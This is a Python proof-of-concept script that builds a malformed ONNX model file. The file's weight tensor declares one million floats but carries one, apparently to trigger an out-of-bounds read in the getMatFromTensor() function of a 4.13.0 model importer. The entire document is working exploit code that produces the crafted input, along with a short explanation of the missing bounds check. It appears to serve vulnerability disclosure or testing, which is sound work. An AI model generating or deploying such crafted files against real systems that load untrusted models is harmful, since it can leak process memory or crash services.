#!/usr/bin/env python3
"""Builds poc.onnx: an ONNX model whose initializer declares 1,000,000 floats
but carries a payload of one.

getMatFromTensor() in 4.13.0 sizes the destination Mat from the declared shape
and then copies from the payload without comparing the two, so it reads
~4 MB out of a 4-byte buffer. Written with a minimal protobuf wire encoder so
the file has no dependency on the onnx package.
"""
import struct

def vi(n):
    out = b""
    while True:
        b7 = n & 0x7f; n >>= 7
        out += bytes([b7 | (0x80 if n else 0)])
        if not n:
            return out
def tag(f, wt): return vi((f << 3) | wt)
def fld_v(f, n): return tag(f, 0) + vi(n)
def fld_b(f, d):
    if isinstance(d, str): d = d.encode()
    return tag(f, 2) + vi(len(d)) + d

FLOAT = 1
DECLARED_ELEMS = 1_000_000

# TensorProto{dims=1, data_type=2, name=8, raw_data=9}
tensor = (fld_v(1, DECLARED_ELEMS) + fld_v(2, FLOAT) + fld_b(8, "W")
          + fld_b(9, struct.pack("<f", 1.0)))          # one float of payload
# NodeProto{input=1, output=2, name=3, op_type=4}
node = fld_b(1, "W") + fld_b(2, "Y") + fld_b(3, "n") + fld_b(4, "Identity")
def value_info(name, dims):
    shape = b"".join(fld_b(1, fld_v(1, d)) for d in dims)
    return fld_b(1, name) + fld_b(2, fld_b(1, fld_v(1, FLOAT) + fld_b(2, shape)))
# GraphProto{node=1, name=2, initializer=5, input=11, output=12}
graph = (fld_b(1, node) + fld_b(2, "g") + fld_b(5, tensor)
         + fld_b(11, value_info("X", [1, 1])) + fld_b(12, value_info("Y", [DECLARED_ELEMS])))
# ModelProto{ir_version=1, producer_name=2, opset_import=8, graph=7}
model = (fld_v(1, 8) + fld_b(2, "poc")
         + fld_b(8, fld_b(1, "") + fld_v(2, 13)) + fld_b(7, graph))
open("poc.onnx", "wb").write(model)
print(f"poc.onnx: {len(model)} bytes "
      f"(declares {DECLARED_ELEMS} floats, carries 1)")
